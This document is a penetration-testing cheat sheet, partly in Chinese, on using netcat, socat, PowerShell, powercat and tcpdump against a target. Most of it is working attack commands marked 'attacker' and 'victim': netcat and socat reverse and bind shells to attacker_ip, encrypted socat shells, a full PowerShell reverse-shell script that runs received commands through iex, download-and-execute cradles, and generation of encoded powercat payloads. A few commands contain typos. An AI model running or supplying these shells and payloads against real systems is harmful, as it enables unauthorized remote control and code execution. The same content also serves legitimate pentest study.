# Practical Tools

一些渗透场景中, 目标环境中一般已有的工具

## Netcat

utility which reads and writes data across network connections, using TCP or UDP protocols

### Connecting to a TCP/UDP Port

- `n` skip dns name resolution
- `v` add some verbosity

```bash
nc -nv ip port
```

### Listening on a TCP/UDP Port

- `n` diable dns name resolution
- `l` create a listener
- `p` specify the listening port number
- `v` add some verbosity
- `e` specify filename to exec after connect
- `c` specify shell commands to exec after connect
- `k` forces nc to stay listening for another connection after its current connection is completed

```bash
nc -nlvp port
```

### Transferring Files with Netcat

1. use redirection

```bash
# receive
nc -nlvp port > file

# send
nc -nv ip port < file
```

### Remote Administration with Netcat

1. bind shell

```bash
# victim
nc -nlvp port -e bash

# attacker
nc -nv ip port
```

2. reverse shell

```bash
# attacker
nc -nlvp export 

# victim
nc -nv ip port -e bash

```

## Socat

1. netcat & socat

```bash
# listen on 80
nc -lvp localhost 443
socat TCP4-LISTEN:443 STDOUT

# connect to  remote_ip:80
nc remote_ip 80
socat - TCP4:remote_ip:80
```

2. Socat File Transfers

```bash
# sender
socat TCP4-LISTEN:443,fork file:xxxxx

# receiver
socat - TCP4:remote_ip:80 file:xxxxx,create
```

3. Socat Reverse Shells

```bash
# reverse shell
## attacker
## victim
socat TCP4:attacker_ip:port EXEC:/bin/bash

# bind shell
## victim
socat -d -d TCP4-LISTEN:prot STDOUT EXEC:/bin/bash
## attacker
socat - TCP4:attacker_ip:port STDOUT
```

4. Socat with openssl

```bash
# generate a key
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt

# combine .key and .crt into a .pem
cat xxxx.key xxx.crt > xxx.pem

# listen
socat OPENSSL-LISTEN:port,cert=xxx.pem,verify=0

# connect
socat - OPENSSL:ip:port,verify=0
```

## Powershell

[Powershell Documentation](https://docs.microsoft.com/en-us/powershell/)

1. change execution policy

```powershell
Set-ExecutionPolicy Unrestricted

socat -d -d TCP4-LISTEN:port STDOUT
# check
Get-ExecutionPolicy
```

2. Powershell File Transfers

```bash
# download file
powershell -c "(new-object System.Net.WebClient).DownloadFile($sourceFile, $destinationFile)"

# download text file as string

(New-Object System.Net.Webclient).DownloadString($url)

# destinationFile 需要执行的shell有写权限, 不然会报: 对路径“$destinationFIle”的访问被拒绝 或 InvalidOperation: (:) []，RuntimeException
```

3. Powershell Reverse Shells

***attacker***

```bash
nc -lvpn 443
```

***victim***
流量未加密, 可直接检测

```powershell
$client = New-Object System.Net.Sockets.TCPClient(ip,443);  # crate a tcp connect
$stream = $client.GetStream(); 
[byte[]]$bytes = 0..65535|%{0};

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
```

```powershell
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);
$listener.start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '>';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}

$client.Close();
$listener.Stop();
```

## [Powercat](https://github.com/besimorhino/powercat)

1. Powercat File transfers

```bash
# receiver

nc -lnvp 443 > recveiving_file_name
```

```powershell
# sender
# load powercat to memory
iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')

# also load by
. .\powercat.ps1

# sending
powercat -c ip -p port -i file_to_send
```

2. Powercat Reverse Shells

```powershell
powercat -c ip -p port -e cmd.exe
```

3. Powercat Bind Shells

```powershell
powercat -l -p 443 -e cmd.exe2
```

4. Powercat Stand-Alone Payloads

```powershell
# generate payload
powercat -c ip -p port -e cmd.exe(.etc) -g > payload.ps1

# run the payload on victim 
./payload.ps1

# generate encoded payload
powercat -c ip -p port -e cmd.exe(.etc) -ge > payload.ps1

# run encoded paylaod
powershell.exe -E payload
```

## tcpdump

- `r` read packet from file
- `n` do not convert address (i.e., host address, port numbers, etc.) to names
- `X` print packet data in both HEX and ASCII format
- `A` print each packet in ASCII, Handy for capturing web pages

1. Header Filtering

```bash
tcpdump -A -n 'tcp[13] = 24'

# with tcpflags
tcpdump 'tcp[tcpflags] == tcp-syn'

```

tips:

***使用 `-r` 读取文件时, 若不需要解析ip/端口, 则最好添加 `-n` 参数, 不然会很慢, 伴随大量dns请求***
